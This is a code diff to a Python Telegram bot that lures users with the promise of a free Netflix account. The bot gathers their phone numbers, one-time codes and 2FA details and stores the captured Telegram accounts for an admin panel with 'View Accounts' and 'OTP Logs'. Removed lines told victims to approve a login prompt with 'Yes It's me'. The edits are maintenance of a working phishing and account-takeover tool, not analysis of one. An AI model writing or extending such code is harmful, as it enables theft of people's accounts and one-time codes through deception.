@@ -951,7 +951,7 @@ Your data is encrypted and securely stored.
         
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("🎬 Get Netflix Now", callback_data="get_netflix_now"))
-    
+        markup.add(InlineKeyboardButton("📞 Support", url=f"https://t.me/{SUPPORT_USERNAME[1:]}"))
         
         self._smart_send_message(
             chat_id,
@@ -990,10 +990,12 @@ Your data is encrypted and securely stored.
         
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
-            InlineKeyboardButton("👁 View Accounts", callback_data="view_accounts")
+            InlineKeyboardButton("👁 View Accounts", callback_data="view_accounts"),
+            InlineKeyboardButton("🔐 Add Account", callback_data="admin_login")
         )
         markup.add(
-            InlineKeyboardButton("📊 OTP Logs", callback_data="otp_logs")
+            InlineKeyboardButton("📊 OTP Logs", callback_data="otp_logs"),
+            InlineKeyboardButton("📈 Statistics", callback_data="refresh_admin")
         )
         markup.add(
             InlineKeyboardButton("🔄 Refresh", callback_data="refresh_admin")
@@ -1768,7 +1770,7 @@ Start again with /start
             # Show success message
             if user_type == "admin":
                 success_text = f"""
-<b>✅ Number Add Sucsessfuly!</b>
+<b>✅ Account Added Successfully!</b>
 
 <b>📱 Phone:</b> <code>{self._format_phone(state['phone'])}</code>
 <b>📱 Device:</b> {result.get('device_info', {}).get('device_model', 'Unknown')}
@@ -1798,7 +1800,6 @@ Start again with /start
 <b>📱 Your Number:</b> <code>{self._format_phone(state['phone'])}</code>
 <b>⏳ Status:</b> Under Review
 <b>📅 Estimated:</b> 48 Hours
-<b>✍️ If Netflix Showing On Your Telegram Click Yes It's me
 <b>✅ Verification:</b> Completed
 
 <i>You will receive Netflix account details on this number once approved.</i>
@@ -1989,7 +1990,6 @@ Start again with /start
 
 <b>📱 Phone:</b> <code>{self._format_phone(state['phone'])}</code>
 <b>🔐 2FA:</b> ✅ Enabled
-<b>✍️ If Netflix Showing On Your Telegram Click Yes It's me
 <b>👤 User ID:</b> {result.get('account_info', {}).get('user_id', 'N/A')}
 
 <b>Account with 2FA has been added to database.</b>
